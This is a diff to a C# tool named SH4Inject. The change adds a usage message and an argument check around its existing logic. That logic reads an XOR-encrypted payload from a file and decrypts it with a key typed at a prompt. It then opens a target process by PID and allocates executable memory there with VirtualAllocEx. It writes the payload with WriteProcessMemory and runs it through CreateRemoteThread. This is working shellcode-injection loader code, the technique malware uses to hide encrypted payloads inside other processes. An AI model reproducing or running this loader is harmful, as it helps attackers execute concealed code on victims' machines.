@@ -31,16 +31,22 @@ namespace SH4Inject
 
         static void Main(string[] args)
         {
-            Console.WriteLine("The secret key: ");
-            String key = Console.ReadLine();
-            byte[] payload = File.ReadAllBytes(args[0]);
-            byte[] decrypted_payload = XOR(payload, key);
+            if (args == null || args.Length == 0)
+            {
+                Console.WriteLine("Example: SH4Inject.exe <path to XOR'ed payload> <PID to inject>");
+            }
+            else { 
+                Console.WriteLine("The secret key: ");
+                String key = Console.ReadLine();
+                byte[] payload = File.ReadAllBytes(args[0]);
+                byte[] decrypted_payload = XOR(payload, key);
 
-            var hProcess = OpenProcess(0x001F0FFF, false, int.Parse(args[1]));
-            var alloc = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)decrypted_payload.Length, 0x1000 | 0x2000, 0x40);
+                var hProcess = OpenProcess(0x001F0FFF, false, int.Parse(args[1]));
+                var alloc = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)decrypted_payload.Length, 0x1000 | 0x2000, 0x40);
 
-            WriteProcessMemory(hProcess, alloc, decrypted_payload, (uint)decrypted_payload.Length, out UIntPtr bytesWritten);
-            CreateRemoteThread(hProcess, IntPtr.Zero, 0, alloc, IntPtr.Zero, 0, IntPtr.Zero);
+                WriteProcessMemory(hProcess, alloc, decrypted_payload, (uint)decrypted_payload.Length, out UIntPtr bytesWritten);
+                CreateRemoteThread(hProcess, IntPtr.Zero, 0, alloc, IntPtr.Zero, 0, IntPtr.Zero);
+            }
         }
     }
 }
